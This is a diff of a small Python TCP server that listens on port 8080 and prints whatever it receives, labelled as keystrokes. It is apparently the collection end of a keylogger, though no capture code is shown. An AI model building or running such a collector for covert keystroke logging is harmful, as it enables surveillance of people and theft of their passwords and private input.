@@ -1,25 +1,35 @@
 import socket
-import threading
 
-SERVER_IP = "0.0.0.0"
-SERVER_PORT = 8080
+# Define the host and port
+HOST = "0.0.0.0"  # Listen on all interfaces
+PORT = 8080       
 
-def handle_client(client_socket, client_address):
-    print(f"Connection from {client_address}")
-    while True:
-        data = client_socket.recv(1024)
-        if not data:
-            break
-        print(data.decode("utf-8"))
-    client_socket.close()
+def start_server():
+    try:
+        # Create a socket
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind((HOST, PORT))
+        server_socket.listen(5)  # Maximum of 5 connections
+        print(f"Server listening on {HOST}:{PORT}")
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((SERVER_IP, SERVER_PORT))
-server.listen(5)
+        while True:
+            # Accept a client connection
+            client_socket, client_address = server_socket.accept()
+            print(f"Connection received from {client_address}")
 
-print(f"Listening on {SERVER_IP}:{SERVER_PORT}")
+            # Receive data from the client
+            with client_socket:
+                while True:
+                    data = client_socket.recv(1024)  # Receive 1024 bytes
+                    if not data:
+                        break  # Exit loop if no data received
+                    # Decode and print the keystrokes
+                    print(f"Keystrokes: {data.decode('utf-8')}")
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        server_socket.close()
 
-while True:
-    client_socket, client_address = server.accept()
-    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
-    client_thread.start()
+if __name__ == "__main__":
+    start_server()
+
